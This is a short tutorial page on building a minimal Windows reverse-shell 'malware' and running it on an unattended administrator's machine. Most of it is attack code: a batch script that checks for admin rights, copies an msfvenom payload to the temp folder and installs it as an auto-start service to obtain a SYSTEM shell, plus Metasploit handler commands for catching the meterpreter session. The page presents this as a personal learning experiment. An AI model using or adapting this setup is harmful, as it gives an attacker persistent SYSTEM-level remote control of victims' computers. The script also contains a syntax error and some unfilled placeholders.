# Reverse shell

In this section, I aim to experiment and provide a simple example of a "malware" that can be executed as an **Administrator** account on a target's Windows machine. For simplicity, I assume the weakest security scenario:

a. User is in the **Administrators** group on the machine

b. User left the machine unattended while being logged in

c. There is no anti-virus solutions (besides Windows defender) running on the machine

&#x20;The "malware" will simply provide a remote shell as the **SYSTEM** user.

> Note: the setup and techniques used in this example is EXTREMELY minimal, and OPSEC is not taken into account.

### Setup

The following outlines the root directory of the "malware" folder&#x20;

1. `rvshell.exe`

* Generated with msfvenom

2. `shell.cmd`

* To be executed as administrators&#x20;
  * GUI: Right-click -> "Run as administrator"

{% code title="shell.cmd" overflow="wrap" %}
```batch
REM Executes a C# script that returns a boolean value that indicates if the current user is in the "Adminstrators" group, before storing the value in the "ISADMIN" env variable
for /f "delims=" %%a in ('powershell.exe -NoProfile -Command "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)"') do set ISADMIN=%%a

REM Echo the value of the "ISADMIN" env variable
echo ISADMIN=%ISADMIN%

REM User is not an administrator: EXIT
if /i "%ISADMIN%"!="True" (
    echo User is NOT an administrator
    exit
    )

REM User is an administrator: continue next step
set RVSHELL_EXE=%TEMP%\rvshell.exe

REM Copy reverse shell payload to a temp folder
copy /y rvshell.exe %RVSHELL_EXE%

REM Create and start a service with sc.exe

sc.exe create "rvshell" binPath= "%RVSHELL_EXE%" start= auto
sc.exe start "rvshell"

REM EXIT current prompt
exit
```
{% endcode %}

a. ...

b. `[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)`&#x20;

* A C# one-liner which output a boolean value that indicates if the current user is in the "**Administrators**" group

#### Catch the shell

{% code title="Attacker machine" overflow="wrap" %}
```sh
$ msfconsole
msf6> set exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set lhost <lhsot>
msf6> set lport <lport>
msf6> run
```
{% endcode %}

### Resources

1. **Powershell.exe**

{% embed url="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1" %}

2. `set` command

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1" %}



